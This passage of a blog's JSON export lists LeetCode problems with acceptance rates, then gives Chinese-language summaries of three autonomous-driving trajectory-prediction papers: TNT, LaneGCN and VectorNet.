C++ / Python √ 102 Binary Tree Level Order Traversal 42.7% Medium C++ / Python √ 101 Symmetric Tree 40.4% Easy C++ / Python √ 100 Same Tree 47.8% Easy C++ / Python √ 99 Recover Binary Search Tree 31.1% Hard √ 98 Validate Binary Search Tree 24.1% Medium √ 97 Interleaving String 25.2% Hard C++ / Python √ 96 Unique Binary Search Trees 42.0% Medium √ 95 Unique Binary Search Trees II 32.3% Medium √ 94 Binary Tree Inorder Traversal 49.8% Medium √ 93 Restore IP Addresses 28.5% Medium √ 92 Reverse Linked List II 31.4% Medium √ 91 Decode Ways 20.3% Medium C++ / Python √ 90 Subsets II 38.3% Medium C++ / Java / Python √ 89 Gray Code 42.5% Medium C++ / Python √ 88 Merge Sorted Array 32.1% Easy C++ / Python √ 87 Scramble String 29.7% Hard C++ / Python √ 86 Partition List 33.5% Medium C++ / Python √ 85 Maximal Rectangle 29.7% Hard C++ / Python √ 84 Largest Rectangle in Histogram 27.6% Hard C++ / Python √ 83 Remove Duplicates from Sorted List 40.3% Easy C++ / Python √ 82 Remove Duplicates from Sorted List II 30.0% Medium C++ / Python √ 81 Search in Rotated Sorted Array II 32.7% Medium C++ / Python √ 80 Remove Duplicates from Sorted Array II 36.8% Medium C++ / Python √ 79 Word Search 28.1% Medium C++ / Python √ 78 Subsets 44.9% Medium C++ / Java / Python √ 77 Combinations 41.3% Medium C++ / Java / Python √ 76 Minimum Window Substring 26.8% Hard C++ / Python √ 75 Sort Colors 38.9% Medium C++ / Python √ 74 Search a 2D Matrix 34.6% Medium C++ / Python √ 73 Set Matrix Zeroes 36.5% Medium C++ / Python √ 72 Edit Distance 32.6% Hard C++ / Java / Python √ 71 Simplify Path 26.3% Medium √ 70 Climbing Stairs 41.3% Easy C++ / Python √ 69 Sqrt(x) 28.9% Easy C++ / Python √ 68 Text Justification 20.0% Hard C++ / Python √ 67 Add Binary 34.1% Easy C++ / Python √ 66 Plus One 39.8% Easy C++ / Python √ 65 Valid Number 12.9% Hard √ 64 Minimum Path Sum 40.8% Medium C++ / Python √ 63 Unique Paths II 32.2% Medium C++ / Python √ 62 Unique Paths 42.9% Medium C++ / Python √ 61 Rotate List 24.5% Medium C++ / Python √ 60 Permutation Sequence 29.5% Medium √ 59 Spiral Matrix II 41.0% Medium √ 58 Length of Last Word 32.1% Easy C++ / Python √ 57 Insert Interval 29.0% Hard C++ / Python √ 56 Merge Intervals 32.0% Medium C++ / Python √ 55 Jump Game 29.5% Medium C++ / Python √ 54 Spiral Matrix 27.3% Medium √ 53 Maximum Subarray 40.3% Easy √ 52 N-Queens II 46.9% Hard √ 51 N-Queens 33.3% Hard √ 50 Pow(x, n) 26.0% Medium √ 49 Group Anagrams 38.5% Medium √ 48 Rotate Image 41.9% Medium C++ / Python √ 47 Permutations II 35.1% Medium C++ / Java / Python √ 46 Permutations 47.4% Medium C++ / Java / Python √ 45 Jump Game II 26.1% Hard C++ / Python √ 44 Wildcard Matching 21.0% Hard √ 43 Multiply Strings 28.0% Medium √ 42 Trapping Rain Water 37.6% Hard C++ / Java / Python √ 41 First Missing Positive 25.8% Hard C++ / Python √ 40 Combination Sum II 36.0% Medium C++ / Java / Python √ 39 Combination Sum 41.5% Medium C++ / Java / Python √ 38 Count and Say 36.8% Easy C++ / Python √ 37 Sudoku Solver 32.1% Hard C++ / Python √ 36 Valid Sudoku 37.6% Medium C++ / Python √ 35 Search Insert Position 40.0% Easy C++ / Python √ 34 Search for a Range 31.6% Medium C++ / Python √ 33 Search in Rotated Sorted Array 31.9% Medium C++ / Python √ 32 Longest Valid Parentheses 23.2% Hard C++ / Python √ 31 Next Permutation 29.1% Medium C++ / Java / Python √ 30 Substring with Concatenation of All Words 22.3% Hard C++ / Python √ 29 Divide Two Integers 15.7% Medium C++ / Python √ 28 Implement strStr() 29.0% Easy C++ / Python √ 27 Remove Element 40.8% Easy C++ / Python √ 26 Remove Duplicates from Sorted Array 36.4% Easy C++ / Python √ 25 Reverse Nodes in k-Group 31.7% Hard C++ √ 24 Swap Nodes in Pairs 39.2% Medium C++ √ 23 Merge k Sorted Lists 28.1% Hard C++ / Python √ 22 Generate Parentheses 48.1% Medium C++ / Python √ 21 Merge Two Sorted Lists 41.2% Easy C++ / Python √ 20 Valid Parentheses 34.0% Easy C++ / Python √ 19 Remove Nth Node From End of List 34.0% Medium C++ / Python √ 18 4Sum 27.5% Medium C++ / Java / Python √ 17 Letter Combinations of a Phone Number 36.5% Medium C++ / Python √ 16 3Sum Closest 31.7% Medium C++ / Python √ 15 3Sum 21.8% Medium C++ / Java / Python √ 14 Longest Common Prefix 31.6% Easy C++ / Java / Python √ 13 Roman to Integer 48.1% Easy √ 12 Integer to Roman 46.2% Medium √ 11 Container With Most Water 37.1% Medium C++ / Java / Python √ 10 Regular Expression Matching 24.3% Hard √ 9 Palindrome Number 35.8% Easy C++ / Python √ 8 String to Integer (atoi) 14.1% Medium C++ / Python √ 7 Reverse Integer 24.4% Easy C++ / Java / Python √ 6 ZigZag Conversion 27.3% Medium C++ / Java √ 5 Longest Palindromic Substring 25.3% Medium C++ / Java / Python √ 4 Median of Two Sorted Arrays 23.1% Hard C++ / Python √ 3 Longest Substring Without Repeating Characters 24.7% Medium √ 2 Add Two Numbers 28.6% Medium C++ / Java / Python √ 1 Two Sum 38.0% Easy C++ / Java / Python"}],"posts":[{"title":"【Paper Weekly】TNT: Target-driveN Trajectory Prediction","slug":"waymo-tnt-prediction","date":"2020-12-12T12:14:51.000Z","updated":"2020-12-16T16:24:38.573Z","comments":true,"path":"waymo-tnt-target-driveN-trajectory-prediction-paper/","link":"","permalink":"https://www.hrwhisper.me/waymo-tnt-target-driveN-trajectory-prediction-paper/","excerpt":"继vectornet之后，Waymo 行为预测的paper：《TNT: Target-driveN Trajectory Prediction》","text":"继vectornet之后，Waymo 行为预测的paper：《TNT: Target-driveN Trajectory Prediction》 Overview 对于自动驾驶的预测任务来说，其他agent具有高度不确定性，通常是一个多模态的结果(multimodal distribution)，比如，可能会直行、或者左转。 在过去的工作中，多模态的建模有用conditional variational autoencoders (CVAEs) generative adversarial networks (GANs) 和 single-step policy roll-out 的方法。这些方法虽然效果不错，但是使用隐变量的方法很难进行解释，且时常需要用sample的方式来评估一些任务（如左转的概率有多大？）。并且容易遇到模态坍缩的问题（mode collapse）。 因此，在TNT这篇paper中，将预测任务拆解为三步： 给定环境的context，估计每个候选点的可能性，从而选择概率高的候选点，下图分别用钻石和星星表示候选点和选中点 根据目标，估计每个选定目标的轨迹（分布） 对所有的轨迹进行排名的评分和选择 image-20201212221344631 虽然最后训练是end-to-end，但是经过了上面的三个步骤，每个步骤的输出都是可解释，部署时更容易和专家知识结合。 TNT在Argoverse Forecasting dataset 和INTERACTION dataset 取得了最好的效果。行人预测的任务中，在Stanford Drone dataset 和in-house Pedestrian-atIntersection dataset都取得了最好的效果。 建模 公式描述 给定agent历史的状态\\(\\boldsymbol{s}_p = [s_{-T&#39;+1}, s_{-T&#39;+2}, \\cdots, s_0]\\)，预测的任务是预测其未来的状态\\(\\boldsymbol{s}_F = [s_{1}, s_{2}, \\cdots, s_T]\\)。另外，还有相关的环境context历史信息\\(\\boldsymbol{c}_p = [c_{-T&#39;+1}, c_{-T&#39;+2}, \\cdots, c_0]\\)。 因此，输入可以写为\\(\\boldsymbol{x} = (\\boldsymbol{s}_p, \\boldsymbol{c}_p)\\), 最后想要求取的概率分布是\\(p(\\boldsymbol{s}_F|\\boldsymbol{x})\\). 前面提到过\\(p(\\boldsymbol{s}_F|\\boldsymbol{x})\\)是一个多模态的。未来的不确定性可以分解为两个部分：一个是意图的不确定性（如是要左转还是右转），一个是控制的不确定性（如执行转弯需要的fne-grained motion ）。因此这里将它拆解: \\[ p\\left(\\boldsymbol{s}_F | \\boldsymbol{x}\\right) = \\int_{\\tau \\in \\mathcal{T}(c_p)} p(\\tau|\\boldsymbol{x}) p(\\boldsymbol{s}_F | \\tau, \\boldsymbol{x}) d\\tau \\] \\(\\mathcal{T}(c_p)\\)这个表示在观察的context历史信息\\(\\boldsymbol{c}_p\\)下，隐含的target空间。 因此，\\(p(\\tau | \\boldsymbol{x})\\)就代表了到target的概率，能够表示出意图的不确定性，实践中可以看成是一个分类的任务；而当target 已经确定了之后，control的不确定性在之后的实验中证明可以用简单的单模态分布来表达。 总的来说，TNT的流程如下图： image-20201213164820687 环境encoding 当HDMap是可用的时候，采用了vectorNet来encode环境的上下文; 当HDMap不可用的时候，采用语义地图cnn来encode环境 步骤1. target prediction 实践中，将会有N个候选的target，每个target有中心位置和偏离的offset : \\(\\mathcal{T} = \\{\\tau^n\\} = \\{(x^n, y^n) + (\\Delta x^n, \\Delta y^n)\\}_{n=1}^N\\) target的分布可以用下面离散化的形式表示： \\[ p(\\tau^n | \\boldsymbol{x}) = \\pi(\\tau^n | \\boldsymbol{x}) \\cdot \\mathcal{N}(\\Delta x^n | v_x^n(\\boldsymbol{x})) \\cdot\\mathcal{N}(\\Delta y^n | v_y^n(\\boldsymbol{x})) \\] 其中，\\(\\pi(\\tau^n|\\boldsymbol{x}) = \\exp f(\\tau^n, \\boldsymbol{x}) / \\sum_{\\tau&#39;} f(\\tau&#39;, \\boldsymbol{x})\\)是选中第n个target的概率，\\(\\mathcal{N}(\\cdot|v(\\cdot))\\)是normal的distribution（假设方差为1）。 \\(f(\\cdot)\\)和\\(v(\\cdot)\\)实现中采用2层的MLP，输入为\\((x^k, y^k)\\)和环境context特征\\(\\boldsymbol{x}\\)，用来预测target的概率和最可能的offset。训练的loss function定义如下： \\[ \\mathcal{L}_{s1} = \\mathcal{L}_{cls}(\\pi, u) + \\mathcal{L}_{offset}(v_x, v_y, \\Delta x^u, \\Delta y^u) \\] \\(\\mathcal{L}_{cls}\\)采用cross entropy作为Loss，\\(\\mathcal{L}_{offset}\\)采用hubder作为loss， u是最接近ground truth location的target，\\(\\Delta x^u\\)和\\(\\Delta y^u\\)则是偏离ground truth的距离。 值得一提的是，对于机动车和行人采用不一样的target表示，如下图所示： image-20201213173555011 对于机动车：对lane的centerlines进行均匀采样作为候选的target（标记为黄色菱形） 对于行人，在agent的周围产生虚拟的grid，并用grid point作为target的候选 与直接regression相比，采用离散的target可以有效的防止mode averaging的问题。 在实践中，生成了较大的candidate（如N = 1000），最后选了较少的点作为输出(如M = 50)。 步骤2. Target-conditioned motion estimation 在第二步中，将给定目标的轨迹概率定义为：\\(p(\\boldsymbol{s}_F | \\tau, \\boldsymbol{x}) = \\prod_{t=1}^T p(s_t | \\tau, \\boldsymbol{x})\\). 这里有两个假设： future time是条件独立的，这样使得计算更加高效 给定target后轨迹们的分布是unimodal的 具体的实现上，采用了2layer的MLP，将上下文特征\\(\\boldsymbol{x}\\)和target的location \\(\\tau\\)作为输入，对每个target输出最可能的未来轨迹\\([\\hat{s}_1, \\cdots, \\hat{s}_T]\\). 损失函数如下： \\[ \\mathcal{L}_{s2} = \\sum_{t=1}^T \\mathcal{L}_{reg}(\\hat{s}_t, \\hat{s}_t) \\] \\(\\mathcal{L}_{reg}\\)同样是Huber loss 步骤3. Trajectory scoring and selection 最后一个步骤中，是从生成的轨迹中选出最可能的轨迹。 注意，可能某个target有很高的likelihood, 但是结合轨迹来说可能最后的概率就没有那么高了。 论文采用下面的公式来最大化概率： \\[ \\phi(\\boldsymbol{s}_F | \\boldsymbol{x}) = \\frac{\\exp(g(\\boldsymbol{s}_F, \\boldsymbol{x}))}{\\sum_{m=1}^M\\exp(g(\\boldsymbol{s}_F^m, \\boldsymbol{x}))} \\] 这里\\(g(\\cdot)\\)也是2层的MLP。损失函数采用的是预测的分数和ground truth score之间的cross entropy： \\[ \\mathcal{L}_{s3} = \\mathcal{L}_{CE}(\\phi(\\boldsymbol{s}_F|\\boldsymbol{x}), \\psi (\\boldsymbol{s}_F)) \\] 每条预测轨迹的ground truth score定义为到ground truth trajectory的距离 : \\[ \\psi (\\boldsymbol{s}_F) = \\frac{\\exp\\left(-D\\left(\\boldsymbol{s, s_{GT}}\\right) / \\alpha\\right)}{\\sum_{s&#39;}\\exp\\left(-D\\left(\\boldsymbol{s&#39;, s_{GT}}\\right) / \\alpha\\right)} \\] \\(D(\\boldsymbol{s^i, s^j})= \\max(||s_1^i - s_1^j||_2^2, \\cdots, ||s_t^i - s_t^j||_2^2)\\)，而\\(\\alpha\\)为temperature，有些蒸馏的味道。 为了从M条轨迹中选出最终K条轨迹，还借鉴了目标检测中的非极大值抑制（ non-maximum suppression）的方法，提出了一个去除比较近似的重复轨迹：首先根据所有轨迹的概率进行排序，然后贪心的进行选择，如果一条轨迹距离已经选中的轨迹较远，则选择它，否则就放弃它。这里的距离也和scoring process的方法一样。 Training and inference details 最终，模型的loss就是之前的3个loss加起来： \\[ \\mathcal{L} = \\lambda_1\\mathcal{L}_{s1} + \\lambda_2\\mathcal{L}_{s2}+\\lambda_3\\mathcal{L}_{s3} \\] 在推理的阶段，TNT的步骤如下： encode context sample N个候选的target，并用\\(\\pi(\\tau|\\boldsymbol{x})\\)选中top的M个。 对M个target进行轨迹的估计\\(p(\\boldsymbol{s}_F | \\tau, \\boldsymbol{x})\\) 从M条轨迹中用\\(\\phi(\\boldsymbol{s}_F |\\tau, \\boldsymbol{x})\\)进行打分，并选中top K 实践中， λ1 = 0.1; λ2 = 1.0; λ3 = 0.1. 实验 数据集 Argoverse forecasting dataset [9] provides trajectory histories, context agents and lane centerline for future trajectory prediction. There are 333K 5-second long sequences in the dataset. The trajectories are sampled at 10Hz, with (0, 2] seconds for observation and (2, 5] seconds for future prediction. INTERACTION dataset [10] focuses on vehicle behavior prediction in highly interactive driving scenarios. It provides 4 different categories of interactive driving scenarios: roundabout (10479 vehicles), un-signalized intersection (14867 vehicles), signalized intersection (10933 vehicles), merging and lane changing (3775 vehicles). In-house Pedestrian-at-Intersection dataset (PAID) is an in-house pedestrian dataset collected around crosswalks and intersections. There are around 77K unique pedestrians for training and 12k unique pedestrians for test. The trajectories are sampled at 10Hz, 1-sec history trajectory is used to predict 3-sec future. Map features include crosswalks, lane boundaries and stop/yield signs. Stanford Drone dataset (SDD) [11] is a video dataset with top-down recordings of college campus scenes, collected by drones. The RGB video frames provide context similar to road maps in other datasets. We follow practice of other literature [2, 16, 37], focusing on pedestrian trajectories only: frames are sampled at 2.5 Hz, 2 seconds of history (5 frames) are used as model input, and 4.8 seconds (12 frames) are the future to be predicted. 实现的一些细节 除了Stanford Drone dataset没有map data使用了ResNet50 ConvNet作为环境的encoding ，其余的都用vectorNet。 对于Vectornet来说，Argoverse dataset按照lane centerlines来sample points, INTERACTION dataset用lane boundaries来sample points，它们都是一米一个点。 在行人预测中，以agent周围创建2D的grid（e.g. \\(10m*10m\\)），每个cell的中心（e.g. \\(1m*1m\\)）作为target candidate。 模型方面：TNT三个阶段都采用2层的MLP，hidden unit都是64。 $(_F) $ 中的temperature α 设置为 0.01. 学习Loss方面，λ1 = 0.1; λ2 = 1.0; λ3 = 0.1. Ablation Study image-20201216233406846 首先对三个阶段进行对比，结果如上表。 s1在M = 50的时候，minFDE和 Miss Rate都挺好；s2和s1基本差不多，说明可以通过target来generate轨迹。S3在k=6的时候相比M=50没有太多loss的损失 image-20201216234344072 表2和表3说明了target candidate sampling的密度的影响。发现越密效果越好 image-20201216234457861 表4对比了有无target offset regression，发现有offset regression之后，效果有一定的提高。 表5对比了在s2阶段Huber regressor和CVAE regressor。发现他们在只有一条tarj的时候效果差不多，但是当CVAE的条数增加到10的时候，仅对minADE指标有改善。这验证了在s2阶段 agent motion采用unimodal的假设。 Comparison with state-of-the-art image-20201216235023711 Table7说明了TNT在机动车上的下偶偶最好 Table8和9说明了在PAID数据集和SDD数据集的行人预测上效果最好。 image-20201216235136528 参考文献 Zhao H, Gao J, Lan T, et al. Tnt: Target-driven trajectory prediction[J]. arXiv preprint arXiv:2008.08294, 2020.","categories":[{"name":"study","slug":"study","permalink":"https://www.hrwhisper.me/categories/study/"},{"name":"自动驾驶","slug":"study/自动驾驶","permalink":"https://www.hrwhisper.me/categories/study/%E8%87%AA%E5%8A%A8%E9%A9%BE%E9%A9%B6/"}],"tags":[{"name":"prediction","slug":"prediction","permalink":"https://www.hrwhisper.me/tags/prediction/"},{"name":"paper","slug":"paper","permalink":"https://www.hrwhisper.me/tags/paper/"},{"name":"self-driving car","slug":"self-driving-car","permalink":"https://www.hrwhisper.me/tags/self-driving-car/"},{"name":"Machine Learning","slug":"Machine-Learning","permalink":"https://www.hrwhisper.me/tags/Machine-Learning/"}]},{"title":"【Paper Weekly】 Learning Lane Graph Representations for Motion Forecasting","slug":"learning-lane-graph-Representations-for-motion-forecasting","date":"2020-11-21T02:53:07.000Z","updated":"2020-11-22T02:47:01.462Z","comments":true,"path":"uber-learning-lane-graph-Representations-for-motion-forecasting/","link":"","permalink":"https://www.hrwhisper.me/uber-learning-lane-graph-Representations-for-motion-forecasting/","excerpt":"Overview 这是一篇来自Uber行为预测的文章。 和VectorNet类似，没有用语义地图来对网络进行encode，而是提出了LaneGCN，它使用多个邻接矩阵扩展图的卷积操作，并沿车道进行尺度扩张。为了能够获取复杂车辆和地图的交互，提出了融合网络fusion network进行建模，它包括actor-to-lane, lane-to-lane, lane-to-actor 和 actor-to-actor。 这篇paper提出的方法在Argoverse数据集上取得了SOTA的效果。","text":"Overview 这是一篇来自Uber行为预测的文章。 和VectorNet类似，没有用语义地图来对网络进行encode，而是提出了LaneGCN，它使用多个邻接矩阵扩展图的卷积操作，并沿车道进行尺度扩张。为了能够获取复杂车辆和地图的交互，提出了融合网络fusion network进行建模，它包括actor-to-lane, lane-to-lane, lane-to-actor 和 actor-to-actor。 这篇paper提出的方法在Argoverse数据集上取得了SOTA的效果。 过往方法的缺点 同样也是在说语义地图的方法的缺点 rasterization 的过程不可避免的会导致信息的丢失 使用二维卷积捕捉地图图结构复杂的拓扑结构，效率可能会很低 主要贡献 提出laneGCN，可以有效捕捉复杂的车道拓扑结构和长时依赖 将actor和车道表征为图中的节点，使用1D CNN和LaneGCN，分别提取actor和车道的节点特征，利用A2L, L2L, L2A, A2A来捕捉交互特征 在Argoverse数据集上取得SOTA的效果 和VectorNet的对比 First, VectorNet uses vanilla graph networks with undirected full connections, while we build a sparsely connected lane graph following the map topology and propose task specific multi-type and dilated graph operators. Second, VectorNet uses polyline-level nodes for interaction, while our LaneGCN uses polyline segments as map nodes to capture higher resolution. Note that in our approach nodes in different polylines can interact with each other through dilated connections. VectorNet使用无向全连接的普通图网络（Vanilla GCN），本文根据地图的拓扑构建了稀疏的图，并提出空洞卷积来扩展图的操作 VectorNet使用折线级的节点进行交互，而我们的LaneGCN使用折线段作为地图节点以获取更高的分辨率。注意，在我们的方法中，不同折线中的节点可以扩展连接的相互作用。 网络结构 主要是几个部分： ActorNet从观察到的过去轨迹中提取行动者的特征 HDMap中构造车道图像并使用LaneGCN提取地图特征。 然后使用FusionNet融合模型模拟actor和车道图之间的交互，并预测未来的轨迹 ActorNet actor-net 对于actor过去的轨迹 \\(\\{\\Delta P_{-(T-1)}, ..., \\Delta P_{-1}, \\Delta P_{0} \\}\\), （\\(\\Delta P_t)\\)为2D的坐标），可以构造出模型的输入： 模型输入： \\((x, y, mask) * T\\)， mask代表不足T的长度则补0 模型：用3组多1D的CNN，每组包含2个残差块 + FPN网络 模型输出： \\((128, 1)\\) 这里简单的介绍下FPN网络，结构如下图 fpn-net FPN网络提出来是用在目标检测的任务上。 图a代表将图片进行缩放，对每个缩放的图（也就是不同的尺度）都进行预测，但是这个耗时毕竟大 图b是经典的做法，通过cnn提取特征，然后最后一层得到的feature map用来检测物体，但是小物体在小的feature map上体现不是很明显，效果不好。如Faster R-CNN 图c从图b进行改进，是一种多尺度的方法：大的物体用小的特征图，小的物体用大的特征图，代表是SSD 图d更进一步，顶层特征通过上采样和低层特征做融合，能得到更好的特征表达 MapNet map-net 一些定义： 将Lane node定义为车道中心线任意两个相邻点的连线，它的坐标就是两点之间的平均坐标。 对于Lane node A, 它的前继和后继就是可以直接从A到达的相邻节点；比如图3右图的橙色和蓝色节点 而它的左右邻居定义为最近的节点（l2距离），比如图3右图的紫色和绿色 因此可以定义4个N * N的矩阵\\(\\{A_i\\}_{i \\in\\{pre,suc,left,right\\}}\\)， \\(A_{i,j,k} = 1\\) 表示节点k对于节点j是第i种type的关系。 传统GCN 不熟悉GCN可以参考： graph-convolutional-networks 广泛使用的Graph convolution operator定义为： \\[ Y = LXW \\] X为节点的特征，W是权重的矩阵，L为归一化的拉普拉斯矩阵： \\[ L = D^{-1/2} (I + A) D^{-1/2} \\] 其中D为度矩阵，A为邻接矩阵，I为单位阵。 但是这个普通的卷积方法在我们要处理的case中是比较没效率的： First, it is not clear what kind of node feature will preserve the information in the lane graphs. Second, a single graph Laplacian can not capture the connection type, i.e., losing the directional information carried by the connection type. Third, it is not straightforward to handle long range dependencies, e.g., akin dilated convolution, within this form of graph convolution. 基于上面的几个缺点，提出了LaneConv的操作 Node Feature: 考虑节点的shape（大小和方向）还有坐标： \\[ x_i = \\text{MLP}_{shape}(v_i^{end} - v_i^{start}) + \\text{MLP}_{loc}(v_i) \\] MLP就是多层感知机， \\(v_i^{end}\\)和 \\(v_i^{start}\\)是节点i的start和end的point的坐标，\\(v_i\\)就是第i个节点的坐标； \\(x_i\\)是节点特征矩阵\\(X\\)的第i行，代表第i个lane节点的特征。 LaneConv基本操作 \\[ Y = XW_0 + \\sum_{i\\in \\{pre,suc,left,right\\}} A_iXW_i \\] \\(A_i\\)和\\(W_i\\)是邻接矩阵和权重矩阵，i代表对应的关系。 这里有个问题，用了4个矩阵\\(A\\)，相比直接一个A表示连接关系的区别？ 个人认为是 对不同的连接关系可以用不同的权重来表达，提取的信息会更加的丰富 Dilated LaneConv: 空洞lane卷积 学习CNN种空洞卷积提升感受野的操作，提出了k-dilation LaneConv： \\[ Y = XW_0 + A^k_{pre}XW_{pre,k} + A^k_{suc}XW_{suc, k} \\] \\(A^k_{pre}\\)是矩阵\\(A_{pre}\\)的k次方，这使得我们可以通过k步来传递信息。 注意：Dilated LaneConv只用在前继和后继上。 LaneConv的最终形式 \\[ Y = XW_0 + \\sum_{i\\in \\{left,right\\}} A_iXW_i + \\sum_{c=1}^C \\left( A^{k_c}_{pre}XW_{pre,k_c} + A^{k_c}_{suc}XW_{suc, k_c} \\right) \\] 实践中，采用了LaneConv(1, 2, 4, 8, 16, 32)，见图4 laneGCN-architecture FusionNet 先前的工作更多的是处理actor之间的交互，actor和地图的交互相关研究较少。 融合模块由四个网络子模块组成，用于处理actor和车道节点之间所有的信息流，actors to lanes (A2L), lanes to lanes (L2L), lanes to actors (L2A) and actors to actors (A2A) A2L引入了实时交通信息, 如堵塞或使用的车道 L2L通过传播交通信息来更新lane节点的特征 L2A将更新地图特征并与实时交通信息进行融合，反馈给actor A2A处理actor之间的交互并输出actor的特征，然后用于轨迹的预测 L2L采用了之前说的LaneGCN方法，对于其他的A2L,L2A,A2A采用了spatial attention layer，它们三个建模方式是一样的，以A2L举例来说：给定actor节点i，通过context的lane node j来聚合特征： \\[ y_i = x_i W_0 + \\sum_j \\phi\\left(concat\\left(x_i, \\Delta_{i,j}, x_j\\right)W_1 \\right)W_2 \\] 类似的\\(x_i\\)是第i个节点的特征，W为权重矩阵，\\(\\phi\\)代表layer normalization + RELU，\\(\\Delta_{ij} = \\text{MLP}(v_j - v_i)\\) context的节点定义为l2距离小于一定阈值的节点， A2L, L2A 和A2A 分别设置为7，6，和100米。 PS: 感觉这里原文表达有些问题，如A2L应该是更新lane的节点特征，上面的式子感觉actor i也会更新。 另外，这里的attention和论文引用的transform的self-attention感觉diff也比较大，似乎attention只是体现在W矩阵中 最后完整的网络如下： all-network Prediction Header 使用两个分支，一个分支是回归模型，用来预测k个轨迹，一个分支是分类模型，用来对每个模态进行打分 Learning \\[ L = L_{cls} + \\alpha L_{reg} \\] 分类采用了max-margin的loss，其中，M为actor的总数，K为轨迹生成的数量，\\(\\hat{k}\\)为k条轨迹中具有最小FDE的那条轨迹，以此为label，c为分类模型的置信度输出。 \\[ L_{cls} = \\frac{1}{M(K-1)} \\sum_{m=1}^M \\sum_{k \\ne \\hat{k}} \\max\\left(0, c_{m,k} + \\epsilon - c_{m,\\hat{k}} \\right) \\] 回归用smooth-l1 loss （每个时刻都统计损失） \\[ L_{reg} = \\frac{1}{MT} \\sum_{m=1}^{M} \\sum_{t=1}^T reg(\\boldsymbol{p}_{m,t}^{\\hat{k}} - \\boldsymbol{p}_{m,t}^{*}) \\] 其中，\\({p}_{t}^{*}\\)是ground truth在t时刻的BEV的坐标， \\(reg(\\boldsymbol{x}) = \\sum_i d(x_i)\\)，\\(d(x_i)\\)就是smooth l1 loss: \\[ d(x_i)=\\left\\{ \\begin{aligned} 0.5x_i^2 &amp;&amp; if \\left\\lVert x_i \\right\\rVert &lt; 1\\\\ \\left\\lVert x_i\\right\\rVert - 0.5 &amp;&amp; otherwise, \\end{aligned} \\right. \\] \\(\\left\\lVert x_i\\right\\rVert\\)是 \\(x_i\\)的L1 norm 实验 Dataset Argoverse: 5s轨迹，前2s作为历史信息输入， 后3s预测 训练、验证、测试集数量分别是205942, 39472和78143 Implementation Details 对所有actor和lane距离主车 &lt; 100m的作为输入，以T=0时刻主车为中心，主车t=-1和t=0作为x轴的正半轴。 使用了4个TITAN-X GPU训练， batchsize设为128， learning rate初始设置为\\(1\\times10^{-3}\\), 32个epoch后降为\\(1\\times10^{-4}\\)，训练总共36epoch。 实验分析 和其他模型对比 argoverse-benchmark SOTA的效果 Importance of each module 实验2表明 1. 所有的网络都有一定的性能提升，证明了LaneGCN和网络结构的有效性 2. A2L and L2L 比只用 L2A 效果好很多，说明 actor向map传递了很多有效的信息 ablation-study-of-modules Lane Graph Operators 表3说明 加入残差块能有效的提高性能 multi-type(前继后继、左右邻居) 和空洞卷积也能提高性能 ablation-study-of-lane-graph-operators Qualitative Results 给了4个hard case，如下 hard-cases 第1行其他的模型都丢失了右转的模态，而本文的模型可以成功预测 第2行是在无保护左转的路口, 车辆已经在路口中停留超过2s,缺少历史的信息, 但是本文的模型还是能成功的预测 第3行说本文提出的方法比其他的三个都好一些,(轨迹短一些, 虽然也没有很好, 感觉是矮子里拔将军) 第4行猛加速都没预测对 小结 Uber提出的这篇论文感觉laneGcn还是值得借鉴的。 但是感觉后面fusion net部分讲得不是特别清楚，如attention感觉不太对，而且估计耗时也毕竟大。 参考文献 Liang M, Yang B, Hu R, et al. Learning lane graph representations for motion forecasting[C]//European Conference on Computer Vision. Springer, Cham, 2020: 541-556. Lin T Y, Dollár P, Girshick R, et al. Feature pyramid networks for object detection[C]//Proceedings of the IEEE conference on computer vision and pattern recognition. 2017: 2117-2125.","categories":[{"name":"study","slug":"study","permalink":"https://www.hrwhisper.me/categories/study/"},{"name":"自动驾驶","slug":"study/自动驾驶","permalink":"https://www.hrwhisper.me/categories/study/%E8%87%AA%E5%8A%A8%E9%A9%BE%E9%A9%B6/"}],"tags":[{"name":"prediction","slug":"prediction","permalink":"https://www.hrwhisper.me/tags/prediction/"},{"name":"paper","slug":"paper","permalink":"https://www.hrwhisper.me/tags/paper/"},{"name":"self-driving car","slug":"self-driving-car","permalink":"https://www.hrwhisper.me/tags/self-driving-car/"},{"name":"Machine Learning","slug":"Machine-Learning","permalink":"https://www.hrwhisper.me/tags/Machine-Learning/"}]},{"title":"【Paper Weekly】VectorNet: Encoding HD Maps and Agent Dynamics From Vectorized Representation","slug":"vectornet","date":"2020-11-16T15:30:57.000Z","updated":"2020-12-16T16:06:32.514Z","comments":true,"path":"waymo-vectornet/","link":"","permalink":"https://www.hrwhisper.me/waymo-vectornet/","excerpt":"Waymo 行为预测的paper：《VectorNet: Encoding HD Maps and Agent Dynamics From Vectorized Representation》","text":"Waymo 行为预测的paper：《VectorNet: Encoding HD Maps and Agent Dynamics From Vectorized Representation》 Overview 最近很多Prediction将车辆和环境呈现为一个鸟瞰的图像，并用卷积神经网络（ConvNets）进行编码。VectorNet通过对矢量化高精地图和车辆轨迹，避免了有损渲染和计算密集型ConvNet编码的步骤。 语义地图 vs VectorNet对比图 vector-presentation-vs-rasterized-prepresentation VectorNet在Argoverse和 in-house 的数据集上都取得了最好的效果，并且相比语义地图的方法节省70%的模型参数，节约了计算开销。 网络介绍 image-20201116233730408 向量表示 向量的表示就是上面图2的最左边。 The geographic extent of the road features can be a point, a polygon, or a curve in geographic coordinates. For example, a lane boundary contains multiple control points that build a spline; a crosswalk is a polygon defined by several points; a stop sign is represented by a single point. lane可以表示为splines，人行道可以表示为一个很多个点组成的polygon，stop sign标记可以表示为单一个点。 对于agent来说，他们的轨迹也是一种splines。 这些元素都可以向量化表示： for map features, we pick a starting point and di- rection, uniformly sample key points from the splines at the same spatial distance, and sequentially connect the neighboring key points into vectors; for trajectories, we can just sample key points with a fixed temporal interval (0.1 second), starting from t = 0 , and connect them into vectors. 对于地图的特征：选择一个start poine和朝向，等间距均匀采样关键点，并于相邻的关键点相连为向量 对于agent轨迹，按照0.1s sample关键点，并将它们连接成向量。 通过向量化的过程，可以得到折线polylines，这个polylines和轨迹、地图标注之间是一一对应的。如果给定的时空间隔足够小，得到的这些折线就与原始地图和轨迹十分接近。 我们将属于折线 \\(\\mathcal{P_j}\\)的每一个向量vi看出图中的一个节点，节点特征如下： \\[ v_i = [d_i^s, d_i^e, a_i, j] \\] \\(d_i^s\\)和\\(d_i^e\\)是vector的start和end point的坐标，可以是(x,y)或者(x,y,z)三维的形式 \\(a_i\\)则是属性的特征，比如object的类型，轨迹的时间戳，道路的特征，道路限速等 \\(\\mathcal{P_j}\\)是一个id，表示\\(v_i\\)属于\\(\\mathcal{P_j}\\) Polyline子图构建 对于一个Polyline 